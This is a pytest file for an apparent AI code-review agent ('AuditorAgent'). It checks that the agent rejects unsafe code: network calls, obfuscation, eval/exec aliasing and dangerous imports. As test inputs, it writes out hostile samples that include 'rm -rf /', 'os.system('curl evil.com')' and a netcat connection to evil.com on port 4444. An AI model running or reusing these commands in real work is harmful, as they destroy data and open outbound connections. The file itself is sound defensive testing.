"""Tests for AuditorAgent — independent code reviewer (SEC11 + SEC15)."""

import json

import pytest

from mycelos.agents.auditor import AuditorAgent
from mycelos.llm.mock_broker import MockLLMBroker


@pytest.fixture
def auditor() -> AuditorAgent:
    broker = MockLLMBroker().on_message(
        r".*",
        json.dumps({"approved": True, "findings": [], "recommendation": "Code looks good."}),
    )
    return AuditorAgent(llm=broker)


def test_clean_code_approved(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="from mycelos.sdk import run\nresult = run(tool='email.read', args={})",
        agent_id="email-agent",
    )
    assert result["approved"] is True


def test_unauthorized_import_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="import requests\nresponse = requests.get('https://evil.com')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False
    assert any("import" in f["message"].lower() for f in result["findings"])


def test_subprocess_import_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="import subprocess\nsubprocess.run(['rm', '-rf', '/'])",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_os_system_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="import os\nos.system('curl evil.com')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_base64_obfuscation_detected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="import base64\nurl = base64.b64decode('aHR0cDovL2V2aWwuY29t')",
        agent_id="sus-agent",
    )
    assert result["approved"] is False


def test_hardcoded_url_detected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code='url = "https://api.external-service.com/data"\nresult = run(tool="http.get", args={"url": url})',
        agent_id="agent-x",
    )
    has_url_finding = any("url" in f["message"].lower() or "hardcoded" in f["message"].lower() for f in result["findings"])
    assert has_url_finding
    # URLs are warnings, not auto-reject (agent uses run() correctly)
    assert result["approved"] is True


# ── review_code_and_tests (SEC11 scenario 2) ──


def test_review_code_and_tests_trivial_tests_flagged(auditor: AuditorAgent) -> None:
    result = auditor.review_code_and_tests(
        code="from mycelos.sdk import run\nresult = run(tool='test', args={})",
        tests="def test(): pass",
        agent_id="agent",
    )
    assert any("test" in f["message"].lower() for f in result["findings"])


def test_review_code_and_tests_no_error_cases_flagged(auditor: AuditorAgent) -> None:
    result = auditor.review_code_and_tests(
        code="from mycelos.sdk import run\nresult = run(tool='test', args={})",
        tests="def test_happy():\n    assert 1 == 1\n" * 5,
        agent_id="agent",
    )
    assert any("error" in f["message"].lower() for f in result["findings"])


# ── SEC08: Excessive permissions ──


def test_excessive_capabilities_flagged(auditor: AuditorAgent) -> None:
    result = auditor.review_code_and_tests(
        code="from mycelos.sdk import run",
        tests="def test(): pass",
        agent_id="bad",
        capabilities=["email.read", "shell.exec", "filesystem.write"],
    )
    assert result["approved"] is False
    assert any("dangerous" in f["message"].lower() or "capabilit" in f["message"].lower() for f in result["findings"])


# ── SEC11 ──


def test_sec11_obfuscated_network_call(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code='import base64\nbase64.b64decode("aHR0cDovL2V2aWwuY29t")',
        agent_id="report-agent",
    )
    assert result["approved"] is False


def test_sec11_unauthorized_module(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code='import subprocess\nsubprocess.Popen(["nc", "evil.com", "4444"])',
        agent_id="report-agent",
    )
    assert result["approved"] is False


# ── SEC15 ──


def test_sec15_prompt_is_hardcoded() -> None:
    auditor = AuditorAgent(llm=MockLLMBroker())
    assert hasattr(AuditorAgent, 'SYSTEM_PROMPT')
    assert "independent" in AuditorAgent.SYSTEM_PROMPT.lower() or "review" in AuditorAgent.SYSTEM_PROMPT.lower()


def test_sec15_review_only(auditor: AuditorAgent) -> None:
    assert hasattr(auditor, "review_code")
    assert hasattr(auditor, "review_code_and_tests")
    assert not hasattr(auditor, "modify_agent")
    assert not hasattr(auditor, "register_agent")
    assert not hasattr(auditor, "update_policy")


# ── AST bypass detection ──


def test_bare_eval_detected(auditor: AuditorAgent) -> None:
    """eval() without import should still be caught by AST call analysis."""
    result = auditor.review_code(
        code="data = eval(input())",
        agent_id="bad-agent",
    )
    assert result["approved"] is False
    assert any("eval" in f["message"].lower() for f in result["findings"])


def test_bare_exec_detected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="exec('import os; os.system(\"rm -rf /\")')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_eval_alias_detected(auditor: AuditorAgent) -> None:
    """e = eval; e('code') should be caught."""
    result = auditor.review_code(
        code="e = eval\ne('malicious')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False
    assert any("alias" in f["category"] for f in result["findings"])


def test_os_system_alias_detected(auditor: AuditorAgent) -> None:
    """run = os.system aliasing should be caught."""
    result = auditor.review_code(
        code="import os\nrun_cmd = os.system\nrun_cmd('whoami')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_compile_detected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(
        code="code = compile('print(1)', '<string>', 'exec')\nexec(code)",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_dunder_import_call_detected(auditor: AuditorAgent) -> None:
    """__import__('os') should be caught as dangerous call."""
    result = auditor.review_code(
        code="m = __import__('subprocess')\nm.call(['ls'])",
        agent_id="bad-agent",
    )
    assert result["approved"] is False


def test_from_os_import_system_alias_detected(auditor: AuditorAgent) -> None:
    """`from os import system as s` must be flagged even if `os` itself is allowed."""
    result = auditor.review_code(
        code="from os import system as s\ns('rm -rf /')",
        agent_id="bad-agent",
    )
    assert result["approved"] is False
    assert any("system" in f["message"] for f in result["findings"])


def test_pickle_import_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(code="import pickle", agent_id="bad-agent")
    assert result["approved"] is False
    assert any("pickle" in f["message"] for f in result["findings"])


def test_marshal_import_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(code="import marshal", agent_id="bad-agent")
    assert result["approved"] is False


def test_shelve_import_rejected(auditor: AuditorAgent) -> None:
    result = auditor.review_code(code="import shelve", agent_id="bad-agent")
    assert result["approved"] is False
